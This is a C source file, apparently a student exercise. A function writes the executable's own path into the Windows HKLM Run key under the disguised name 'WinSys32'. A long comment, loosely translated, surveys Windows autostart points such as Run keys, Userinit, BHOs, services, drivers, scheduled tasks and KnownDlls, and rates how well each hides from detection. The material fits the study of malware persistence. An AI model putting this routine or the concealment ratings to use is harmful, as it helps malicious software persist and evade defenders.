#include <windows.h>
#include "autorun.h"

/** Set ahead of time:
    path to file
    reg root to use - HKLM, HKCU, etc.
    reg key to use
    name of value
    value to be set

*/
int setAutorun(){
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL,szPath,MAX_PATH);
    HKEY newValue;
    RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
//    RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
    RegSetValueEx(newValue,"WinSys32",0,REG_SZ,(LPBYTE)szPath,sizeof(szPath));
    RegCloseKey(newValue);
    return 0;
}

/*
Windows self-starter view and analysis
Hu Zhenghao 5110369037

First, the Windows system since the start method
    (A) Logon
General Registry Startup Item.

1, technical principles
When the system starts up, it will start up automatically by loading the program through the normal startup items in the registry, such as Run, RunOnce, StartupProgram, Shell and other key values.

2, to achieve the details
HKLM \ system \ currentcontrol set \ control \ terminal server \ wds \ rdpwd \ StartupPrograms The key values ??are separated by commas.
HKLM \ software \ microsoft \ windows nt \ currentversion \ winlogon \ Userinit contains the user login is started program. Comma separated.
HKLM \ software \ microsoft \ windows nt \ currentversion \ winlogon \ shell Specifies the program to be called when a program call in userinit fails. Comma separated.
               HKLM and HKCU in a variety of Run, RunOnce subkey, specifies the program called at system startup.

3, hidden
Run and RunOnce sub-keys, reputation too loud, weak concealment.
Userinit low degree of attention, concealment is relatively high.
StartupPrograms hidden high, where can not find the corresponding introduction.
Shell hidden high, only when the userinit program call fails to use the shell, userinit hit cover.

    (B) Internet Explorer
IE BHO object

1, technical principles
IE browser will automatically call the BHO object startup

2, to achieve the details
IE window opens, first look for HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ Browser Helper Objects \ CLSID, these CLSID, corresponding to the corresponding BHO plug-in, and then according to this CLSID to HKCR under the CLSIDs found This plug-in information, including file location and so on. IE creates a BHO object based on the CLSID information found, and looks for the IObjectWithSite interface. IE passes IWebBrowser2 (browser plug-in) to the BHO's SetSite method, where it can mount its own event handling method. When the window is closed, IE passes null to the BHO's SetSite method, which is used to remove the mounted event handler.

3, hidden
Hidden high. Its runtime is run as a sub-process of IE, not easy to find.

    (C) Service
system service

1, technical principles
System startup will be incidentally set to automatically set the system services

2, to achieve the details
Under HKLM \ SYSTEM \ CurrentControlSet \ Services \ add a new subkey, Displayname is the service name displayed, ImagePath is the calling parent process, the ImagePath under the parameter subkey is the path of the program, and start is set to 2 to start from.

3, hidden
Hidden high. A wide range of system services, without signature verification can not be detected.

    (D) Drivers
System driver

1, technical principles
System startup need to load the driver, search for the registry to find the driver you want to start.

2, to achieve the details
Under HKLM \ SYSTEM \ CurrentControlSet \ Services \ add a new subkey, Displayname is the service name displayed, ImagePath is the driver's path, start is set to 2 or self-start.

3, hidden
Hidden high. A wide range of system services, without signature verification can not be detected.

    (V) Scheduled Tasks
Scheduled Tasks

1, technical principles
By specifying a specific time, a specific program, you can run the program automatically at a specified time, so that you can run malicious software.

2, to achieve the details
Pre-Windows 7 scheduled tasks are saved in xml format in the C: \ Windows \ Tasks \ directory, and access is not authorized.
After Windows 7, the path to the scheduled task is changed to C: \ Windows \ System32 \ Tasks \ and access is required for Administrator privileges.

3, hidden
Concealment is low. Scheduled tasks are performed in user mode and are therefore easily discoverable.

    (Vi) Known DLLs
Well-known dynamic link library

1, technical principles
KnownDlls windows is a mechanism used to cache frequently used DLL files. KnownDlls must be in the system directory and read the KnownDlls list from the registry at system startup. Later, if you load this dll, first search the system directory, then search the current directory.

2, to achieve the details
In HKLM \ system \ currentcontrolset \ control \ session manager \ knowndlls Add sub key name, the corresponding dll into the system folder.

3, hidden
Hidden high. Because KnownDll is the system default security program, so it will not be further tested.
*/
